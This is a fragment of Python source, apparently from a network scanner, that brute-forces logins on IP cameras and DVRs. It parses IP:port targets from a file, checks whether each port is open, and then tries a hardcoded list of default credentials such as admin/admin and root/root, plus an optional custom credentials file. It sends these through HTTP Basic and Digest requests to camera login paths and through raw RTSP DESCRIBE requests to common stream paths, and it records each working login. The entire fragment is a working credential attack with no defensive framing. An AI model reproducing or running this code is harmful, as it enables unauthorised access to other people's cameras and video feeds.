        # ── Default + custom credential list ──────────────────────────────────
        _BCC_DEFAULT = [
            ('admin',''), ('admin','admin'), ('admin','12345'),
            ('admin','123456'), ('admin','admin123'), ('admin','Admin123'),
            ('admin','password'), ('admin','1234'), ('admin','888888'),
            ('admin','666666'), ('admin','111111'), ('admin','123456789'),
            ('admin','admin1234'), ('admin','pass'),
            ('root',''), ('root','root'), ('root','admin'), ('root','12345'),
            ('root','pass'), ('guest',''), ('guest','guest'),
            ('user','user'), ('user','12345'),
            ('supervisor','supervisor'), ('service','service'),
            ('operator','operator'), ('support','support'),
            ('ubnt','ubnt'), ('ftp','ftp'), ('test','test'),
        ]
        _bcc_creds = list(_BCC_DEFAULT)
        if '--creds-file' in sys.argv:
            _bfi = sys.argv.index('--creds-file')
            if _bfi + 1 < len(sys.argv):
                try:
                    with open(sys.argv[_bfi + 1], encoding='utf-8', errors='replace') as _bf:
                        for _ln in _bf:
                            _ln = _ln.strip()
                            if _ln and not _ln.startswith('#'):
                                _u2, _, _p2 = _ln.partition(':')
                                _bcc_creds.append((_u2.strip(), _p2.strip()))
                except Exception: pass
        # ── Parse file for IP:Port targets ────────────────────────────────────
        _bcc_text  = open(_bcc_src, 'r', encoding='utf-8', errors='replace').read()
        _SEP_bcc   = '=' * 60
        _bcc_raw   = [b.strip() for b in _bcc_text.split(_SEP_bcc) if b.strip()]
        if len(_bcc_raw) <= 1:
            _bcc_raw = [b.strip() for b in _bcc_text.split('\n\n') if b.strip()]
        _bcc_targets = []   # (ip, port, has_known_creds, known_user, known_pass)
        for _blk in _bcc_raw:
            _bip = _bport = _buser = _bpass = ''
            for _ln in _blk.splitlines():
                if ':' not in _ln: continue
                _k, _, _v = _ln.partition(':')
                _k2 = _k.strip().lower(); _v2 = _v.strip()
                if _k2 in ('ip address', 'ip') and not _bip:   _bip   = _v2
                if _k2 == 'port'               and not _bport: _bport = _v2
                if _k2 in ('username', 'user') and not _buser: _buser = _v2
                if _k2 in ('password', 'pass') and not _bpass: _bpass = _v2
            if not _bip or not _bport: continue
            _has_creds = bool(_buser)
            if _bcc_only_creds and not _has_creds: continue
            try: _bcc_targets.append((_bip, int(_bport), _has_creds, _buser, _bpass))
            except ValueError: pass
        # Deduplicate by ip:port, preserve first occurrence
        _bcc_seen_keys = set()
        _bcc_uniq = []
        for _t in _bcc_targets:
            _tk = f'{_t[0]}:{_t[1]}'
            if _tk not in _bcc_seen_keys:
                _bcc_seen_keys.add(_tk)
                _bcc_uniq.append(_t)
        _bcc_targets = _bcc_uniq
        if _bcc_top:
            _bcc_targets = _bcc_targets[:_bcc_top]
        if not _bcc_targets:
            print(f"\n  {Y}No IP:Port targets found in {_bcc_src}.{W}\n")
            sys.exit(0)
        # ── HTTP + RTSP probe helpers ─────────────────────────────────────────
        _BCC_HTTP_PATHS = [
            '/', '/ISAPI/Security/userCheck',
            '/cgi-bin/login.cgi', '/login.asp',
        ]
        _BCC_RTSP_PATHS = [
            '/Streaming/Channels/101',
            '/cam/realmonitor?channel=1&subtype=0',
            '/onvif/profile1',
            '/h264/ch1/main/av_stream',
        ]
        def _bcc_try_http(ip, port, user, pw):
            for _path in _BCC_HTTP_PATHS:
                _url = f'http://{ip}:{port}{_path}'
                try:
                    r = requests.get(_url, auth=_BccBasic(user, pw),
                                     timeout=_bcc_timeout, verify=False,
                                     allow_redirects=False)
                    if r.status_code in (200, 204):
                        return ('HTTP-Basic', _path, r.status_code)
                    if r.status_code == 401 and 'digest' in \
                            r.headers.get('WWW-Authenticate', '').lower():
                        r2 = requests.get(_url, auth=HTTPDigestAuth(user, pw),
                                          timeout=_bcc_timeout, verify=False,
                                          allow_redirects=False)
                        if r2.status_code in (200, 204):
                            return ('HTTP-Digest', _path, r2.status_code)
                except Exception:
                    pass
            return None
        def _bcc_try_rtsp(ip, rtsp_port, user, pw):
            _cred_b64 = _bcc_b64.b64encode(f'{user}:{pw}'.encode()).decode()
            for _rpath in _BCC_RTSP_PATHS:
                try:
                    s = _bcc_sock.socket(_bcc_sock.AF_INET, _bcc_sock.SOCK_STREAM)
                    s.settimeout(_bcc_timeout)
                    s.connect((ip, rtsp_port))
                    _rurl = f'rtsp://{ip}:{rtsp_port}{_rpath}'
                    _req  = (f'DESCRIBE {_rurl} RTSP/1.0\r\n'
                             f'CSeq: 1\r\nUser-Agent: W8Scanner/3.0\r\n'
                             f'Authorization: Basic {_cred_b64}\r\n'
                             f'Accept: application/sdp\r\n\r\n')
                    s.sendall(_req.encode())
                    _resp = s.recv(512).decode('utf-8', errors='replace')
                    s.close()
                    if _resp.startswith('RTSP/1.0 200'):
                        return ('RTSP', _rpath, 200)
                except Exception:
                    pass
            return None
        def _bcc_check_host(args):
            ip, port, _hc, _huser, _hpass = args
            rtsp_port = 554 if port not in (554, 8554) else port
            hits = []
            # ── Fast TCP pre-check: skip host entirely if port is closed/filtered ──
            _pre_port = rtsp_port if (_bcc_rtsp_only and not _bcc_http_only) else port
            try:
                _ps = _bcc_sock.socket(_bcc_sock.AF_INET, _bcc_sock.SOCK_STREAM)
                _ps.settimeout(min(_bcc_timeout, 1.0))
                _ps.connect((ip, _pre_port))
                _ps.close()
            except Exception:
                return (ip, port, [], 0)
            # If block already has known credentials, try those first
            if _hc and _huser:
                _pw0 = _hpass
                if not _bcc_rtsp_only:
                    h = _bcc_try_http(ip, port, _huser, _pw0)
                    if h: hits.append((_huser, _pw0, h))
                if not _bcc_http_only and not hits:
                    h = _bcc_try_rtsp(ip, rtsp_port, _huser, _pw0)
                    if h: hits.append((_huser, _pw0, h))
                if hits:
                    return (ip, port, hits, 1)   # verified known creds
            for _user, _pw in _bcc_creds:
                if not _bcc_rtsp_only:
                    h = _bcc_try_http(ip, port, _user, _pw)
                    if h:
                        hits.append((_user, _pw, h))
                        break
                if not _bcc_http_only:
                    h = _bcc_try_rtsp(ip, rtsp_port, _user, _pw)
                    if h:
                        hits.append((_user, _pw, h))
                        break
            return (ip, port, hits, 0)
